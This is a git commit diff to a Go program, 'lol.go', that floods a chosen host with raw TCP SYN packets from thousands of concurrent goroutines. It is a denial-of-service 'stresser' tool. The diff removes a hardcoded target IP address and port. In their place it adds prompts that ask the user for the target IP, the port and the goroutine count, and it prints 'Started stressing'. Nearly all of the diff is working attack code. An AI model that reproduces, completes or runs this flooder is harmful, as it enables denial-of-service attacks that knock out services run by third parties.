db77f76e1f62d42da03a588f727d3add101598dd
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-11-15 13:58:43 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -7,18 +7,10 @@ import (
 	"time"
 	"net"
 	"encoding/binary"
+	"strconv"
 )
 
-// Number of goroutines
-var numGoroutines = 4000
-
-// Destination IP address
-var destIP = net.ParseIP("193.46.26.78").To4()
-
-// Destination port
-var destPort = 45028
-
-func sendPacket() {
+func sendPacket(destIP net.IP, destPort int) {
 	// Create a raw socket
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
@@ -55,22 +47,40 @@ func sendPacket() {
 		0x00, 0x00, // Urgent pointer
 	}
 
+	fmt.Println("Started stressing", destIP.String())
+
 	for {
 		// Send the SYN packet
-		if err := syscall.Sendto(fd, append(ipHeader, tcpHeader...), 0, &syscall.SockaddrInet4{
+		err := syscall.Sendto(fd, append(ipHeader, tcpHeader...), 0, &syscall.SockaddrInet4{
 			Port: 0,
 			Addr: [4]byte{destIP[0], destIP[1], destIP[2], destIP[3]}, // IP address
-		}); err != nil {
-			log.Fatal(err)
+		})
+		if err != nil {
+			fmt.Println("Failed to send SYN packet to", destIP.String(), ":", err)
+			return
 		}
-		fmt.Println("SYN packet sent to", destIP.String())
 		time.Sleep(1 * time.Second)
 	}
 }
 
 func main() {
+	var ip string
+	var port string
+	var goroutines string
+
+	fmt.Print("Enter IP: ")
+	fmt.Scanln(&ip)
+	fmt.Print("Enter port: ")
+	fmt.Scanln(&port)
+	fmt.Print("Enter amount of goroutines: ")
+	fmt.Scanln(&goroutines)
+
+	destIP := net.ParseIP(ip).To4()
+	destPort, _ := strconv.Atoi(port)
+	numGoroutines, _ := strconv.Atoi(goroutines)
+
 	for i := 0; i < numGoroutines; i++ {
-		go sendPacket()
+		go sendPacket(destIP, destPort)
 	}
 	select {}
 }
